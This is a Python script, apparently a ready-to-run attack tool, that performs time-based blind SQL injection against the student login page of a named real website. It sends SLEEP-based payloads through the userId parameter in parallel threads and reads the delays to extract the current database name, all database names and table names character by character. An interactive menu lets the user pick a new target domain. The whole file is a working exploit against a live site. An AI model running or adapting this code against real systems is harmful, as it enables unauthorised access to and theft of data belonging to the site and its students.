import requests
import time
import urllib.parse
import threading

# ========== BANNER ==========
def print_banner():
    ascii_art = r"""
  _______ _           ______ _       _         __          __   _  __ 
 |__   __| |         |  ____| |     (_)        \ \        / /  | |/ _|
    | |  | |__   ___ | |__  | |_   _ _ _ __   __\ \  /\  / /__ | | |_ 
    | |  | '_ \ / _ \|  __| | | | | | | '_ \ / _`\ \/  \/ / _ \| |  _|
    | |  | | | |  __/| |    | | |_| | | | | | (_||\  /\  / (_) | | |  
    |_|  |_| |_|\___||_|    |_|\__, |_|_| |_|\__,| \/  \/ \___/|_|_|  
                               __/ |         __/ |                    
                              |___/         |___/                                    

         [1m[94m█████████████ by kuppamjohari █████████████[0m
"""
    print(ascii_art)

# Call the function to display the banner
print_banner()
# ========== CONFIG ==========
target_domain = "https://pesgems.in/"
base_path = "studentLogin/studentLogin.action"

post_data = {"password": "fake420"}
headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

delay_threshold = 0.6
sleep_time = 0.6
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
max_length = 30
thread_limit = 6  # More stable at lower concurrency
confirmation_rounds = 2  # Check each char multiple times

# ========== UTILS ==========

def get_base_url():
    return f"{target_domain.rstrip('/')}/{base_path}"

def send_request(payload):
    full_url = f"{get_base_url()}?personType=student&userId={urllib.parse.quote(payload)}"
    start = time.time()
    try:
        requests.post(full_url, data=post_data, headers=headers, timeout=10)
    except requests.RequestException:
        return 0
    return time.time() - start

# ========== CORE EXTRACTION LOGIC ==========

def confirm_char(query, pos, c):
    """Confirm a character multiple times to avoid misreads."""
    matches = 0
    for _ in range(confirmation_rounds):
        payload = (
            f"' AND (SELECT 1 FROM (SELECT(SLEEP({sleep_time}-(IF(ORD(MID(({query}),{pos},1))={ord(c)},0,{sleep_time})))))a) AND '1'='1"
        )
        elapsed = send_request(payload)
        if elapsed > delay_threshold:
            matches += 1
    return matches == confirmation_rounds

def find_char_at_pos(query, pos):
    """Try all chars in parallel and return the one that causes delay."""
    result = {"char": None}
    threads = []

    def worker(c):
        if result["char"]:
            return
        payload = (
            f"' AND (SELECT 1 FROM (SELECT(SLEEP({sleep_time}-(IF(ORD(MID(({query}),{pos},1))={ord(c)},0,{sleep_time})))))a) AND '1'='1"
        )
        elapsed = send_request(payload)
        if elapsed > delay_threshold and confirm_char(query, pos, c):
            result["char"] = c

    for c in charset:
        if result["char"]:
            break
        t = threading.Thread(target=worker, args=(c,))
        threads.append(t)
        t.start()

        while threading.active_count() > thread_limit:
            time.sleep(0.01)

    for t in threads:
        t.join()
    return result["char"]

def extract_string(query, label="Value"):
    extracted = ""
    print(f"[*] Extracting {label}...")
    for pos in range(1, max_length + 1):
        c = find_char_at_pos(query, pos)
        if c is None or c == ' ':
            break
        extracted += c
        print(f"[+] Found char at position {pos}: {c}")
    print(f"\n[✓] Extracted {label}: {extracted}")
    return extracted

# ========== HIGHER-LEVEL FEATURES ==========

def list_databases(limit=10):
    print("[*] Enumerating databases...")
    db_list = []
    for i in range(limit):
        query = f"SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT {i},1"
        result = extract_string(query, f"Database #{i + 1}")
        if not result:
            break
        db_list.append(result)

    print(f"\nAvailable databases [{len(db_list)}]:")
    for db in db_list:
        print(f"[*] {db}")

def list_tables(database_name, limit=20):
    print(f"[*] Enumerating tables from database: {database_name}")
    table_list = []
    for i in range(limit):
        query = (
            f"SELECT DISTINCT(IFNULL(CAST(table_name AS NCHAR),0x20)) "
            f"FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='{database_name}' LIMIT {i},1"
        )
        result = extract_string(query, f"Table #{i + 1}")
        if not result:
            break
        table_list.append(result)

    print(f"\nAvailable tables in `{database_name}` [{len(table_list)}]:")
    for t in table_list:
        print(f"[*] {t}")

# ========== INTERACTIVE MENU ==========

if __name__ == "__main__":
    while True:
        base_url = get_base_url()

        print("\nChoose an option:")
        print(f"1. Change target domain (current: {target_domain})")
        print("2. Extract current database")
        print("3. List all databases")
        print("4. List tables from a database")
        print("5. Exit")
        
        choice = input("Enter: ").strip()
        
        if choice == "1":
            new_domain = input("Enter new domain (e.g., pesgems.in): ").strip()
            if new_domain:
                if not new_domain.startswith("http"):
                    new_domain = "https://" + new_domain
                target_domain = new_domain
                print(f"[✓] Target domain changed to: {target_domain}")
            else:
                print("[!] Domain not changed. Input was empty.")

        elif choice == "2":
            extract_string("SELECT DATABASE()", "Current DB")
        elif choice == "3":
            list_databases()
        elif choice == "4":
            db_name = input("Enter the target database name: ").strip()
            list_tables(db_name)
        
        elif choice == "5":
            print("[*] Exiting...")
            break
        
        else:
            print("[!] Invalid choice.")
